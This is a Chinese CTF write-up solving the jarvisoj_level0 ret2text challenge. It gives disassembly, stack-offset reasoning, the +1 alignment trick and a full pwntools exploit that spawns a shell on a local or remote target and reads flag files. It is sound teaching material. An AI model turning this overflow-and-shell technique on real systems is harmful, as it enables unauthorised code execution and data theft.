# Speedrun：jarvisoj_level0

> 题型：ret2text / 64 位 `read` 栈溢出
> 目标：跳 `callsystem+1`，执行 `system("/bin/sh")`
> 关键：偏移 **136**；目标 **0x400597**

---

## 0. 一句话结论

```text
vulnerable_function:
  char buf[0x80] @ rbp-0x80
  read(0, buf, 0x200)          <- 0x200，远远超过 0x80

  offset = 0x80 + 8 = 0x88 = 136

callsystem @ 0x400596:
  push rbp
  mov rbp,rsp
  mov edi, 0x400684            <- "/bin/sh"
  call system@plt

直接跳 0x400596 会把 system 的栈对齐搞坏
  -> 实际跳 0x400597（跳过 push rbp）
```

Payload：

```python
b'A' * 136 + p64(0x400597)
```

不需要 leak，不需要 canary，不需要 libc 版本。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/ret2text'

file jarvisoj_level0
checksec --file=jarvisoj_level0
nm -n jarvisoj_level0 | grep -E ' (main|callsystem|vulnerable_function)$'
objdump -d -M intel jarvisoj_level0 | sed -n '/<vulnerable_function>:/,/^$/p'
objdump -d -M intel jarvisoj_level0 | sed -n '/<callsystem>:/,/^$/p'
objdump -s -j .rodata jarvisoj_level0
```

关键输出：

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
No RELRO
No canary found
NX enabled
No PIE (0x400000)
Not stripped

0000000000400596 T callsystem
00000000004005a6 T vulnerable_function
00000000004005c6 T main
```

读法：

| 观察 | 结论 |
| --- | --- |
| Not stripped + `nm` 看到 `callsystem` | 后门直接暴露，省去逆向找函数 |
| `callsystem` 里是 `system("/bin/sh")` | 目标是拿 shell，不是 `cat flag` |
| `read(0, buf, 0x200)` | 无边界写，可覆盖 saved RIP |
| No canary | 不需要绕过 canary |
| No PIE | 地址可硬编码 |
| NX enabled | 不能执行栈上 shellcode，正好走 ret2text |

`callsystem` 反汇编：

```asm
0000000000400596 <callsystem>:
  400596: push   rbp
  400597: mov    rbp,rsp
  40059a: mov    edi,0x400684        # "/bin/sh"
  40059f: call   400460 <system@plt>
  4005a4: pop    rbp
  4005a5: ret
```

`.rodata`：

```text
400680 01000200 2f62696e 2f736800 48656c6c  ..../bin/sh.Hell
400690 6f2c2057 6f726c64 0a00               o, World..
```

也就是：

```text
0x400684 -> "/bin/sh"
0x40068c -> "Hello, World\n"
```

---

## 2. 关键逆向

### 2.1 `main`：只负责打印和调用漏洞函数

```asm
00000000004005c6 <main>:
  4005c6: push   rbp
  4005c7: mov    rbp,rsp
  4005ca: sub    rsp,0x10
  4005ce: mov    DWORD PTR [rbp-0x4],edi
  4005d1: mov    QWORD PTR [rbp-0x10],rsi
  4005d5: mov    edx,0xd
  4005da: mov    esi,0x40068c        # "Hello, World\n"
  4005df: mov    edi,0x1
  4005e4: call   400450 <write@plt>
  4005e9: mov    eax,0x0
  4005ee: call   4005a6 <vulnerable_function>
  4005f3: mov    eax,0x0
  4005f8: leave
  4005f9: ret
```

看到 `write(1, "Hello, World\n", 13)` 就可以确认：程序没有别的输入，漏洞只在 `vulnerable_function`。

### 2.2 `vulnerable_function`：漏洞点

```asm
00000000004005a6 <vulnerable_function>:
  4005a6: push   rbp
  4005a7: mov    rbp,rsp
  4005aa: add    rsp,0xffffffffffffff80   # rsp = rbp - 0x80
  4005ae: lea    rax,[rbp-0x80]           # buf
  4005b2: mov    edx,0x200                # 读 0x200 字节
  4005b7: mov    rsi,rax
  4005ba: mov    edi,0x0
  4005bf: call   400470 <read@plt>
  4005c4: leave
  4005c5: ret
```

等价 C：

```c
void vulnerable_function(void) {
    char buf[0x80];
    read(0, buf, 0x200);
}
```

栈布局：

```text
rbp-0x80 .. rbp-0x01 : buf[0x80]
rbp+0x00 .. rbp+0x07 : saved rbp
rbp+0x08 .. rbp+0x0f : saved RIP
```

所以：

```text
offset = 0x80 + 8 = 0x88 = 136
```

---

## 3. 为什么目标必须是 `0x400597`

64 位 System V ABI 要求调用 `system` 前 `rsp` 16 字节对齐。

从 `vulnerable_function` 的 `ret` 进入后门时，栈顶对齐状态并不是“正常函数入口”的状态。如果跳 `0x400596`：

```asm
push rbp        # rsp 再减 8，system 入口错位
mov rbp,rsp
mov edi,0x400684
call system@plt
```

`system` 内部常见的 `movaps` 会直接 SIGSEGV。

跳 `0x400597`：

```asm
mov rbp,rsp     # 跳过 push rbp，保持对齐
mov edi,0x400684
call system@plt
```

本地实测：

| target | 结果 |
| --- | --- |
| `0x400596` | SIGSEGV，shell 起不来 |
| `0x400597` | 成功进入 shell，能执行 `echo` |

这和 `rip` / `warmup_csaw_2016` 的 `+1` 技巧是同一个套路。

---

## 4. Payload 布局

```text
[ 136 字节 'A' ][ p64(0x400597) ]
```

```python
from pwn import *

payload = b'A' * 136 + p64(0x400597)
```

总长度：

```text
136 + 8 = 144 字节
```

`read` 最多读 `0x200`，144 字节完全放得下，不会截断。

---

## 5. 完整 exp

```python
from pwn import *
import os
import re
import ssl
import sys
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./jarvisoj_level0"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))

OFFSET = 0x88
TARGET = 0x400596 + 1


def start():
    if args.LOCAL:
        return process(BIN)

    if not HOST:
        raise SystemExit("[-] set HOST/PORT, or pass LOCAL")

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def exploit():
    p = start()
    p.sendline(b"A" * OFFSET + p64(TARGET))

    # read() 可能把紧跟其后的命令一起吃掉；等 shell 起来再发。
    time.sleep(0.3)
    p.sendline(b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit")

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")


if __name__ == "__main__":
    exploit()
```

本地验证：

```bash
cd '/home/yfhd5/Pwn Writeups/ret2text'
python 06_jarvisoj_level0_exp.py LOCAL
```

正确时会看到：

```text
Hello, World
__PWNED__
```

说明 shell 已经执行了 `echo`；远程把 `HOST` / `PORT` 填上即可。

---

## 6. 交互坑

1. **偏移是 136，不是 128**
   `0x80` 只是 buffer；后面还有 8 字节 saved rbp。

2. **目标必须是 `0x400597`**
   跳 `0x400596` 会执行 `push rbp`，破坏 `system` 的 16 字节对齐。

3. **`read` 会吃掉紧跟的命令**
   `read(0, buf, 0x200)` 一次可能读走 payload 后面的 `cat flag`。
   发完 payload 后 `sleep(0.3)`，再发 shell 命令。

4. **shell 退出后进程可能崩**
   `callsystem` 的 `ret` 会返回到栈上的垃圾地址；只要 flag 已经收到，不用管退出码。

5. **远程协议不一定是 TLS**
   原题可能是明文 TCP，脚本默认 `remote(HOST, PORT)`；
   CTF² 之类的平台再设置 `SSL=1`。

6. **`No RELRO` 是干扰项**
   这题不需要改 GOT，直接 ret2text 就行。

---

## 7. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec` + `nm`：64 位、No PIE、No canary、有 `callsystem` |
| 0:20–0:45 | `objdump vulnerable_function/callsystem`：拿到 offset 136、`/bin/sh`、`0x400596` |
| 0:45–1:05 | 写 payload：`136 + p64(0x400597)` |
| 1:05–1:25 | 本地 `LOCAL` 验证，看到 `__PWNED__` |
| 1:25–1:45 | 填 `HOST/PORT` 打远程，`cat flag*` 收工 |

---

## 8. 题型识别卡

```text
Not stripped + nm 看到 callsystem
+ read(0, buf, 0x200) 且 buf = rbp-0x80
+ callsystem 内 system("/bin/sh")
+ No PIE
= ret2text，offset 136，target callsystem+1 = 0x400597
```

一句话：**136 字节垃圾 + `p64(0x400597)`，不要把 `push rbp` 也跳进去。**

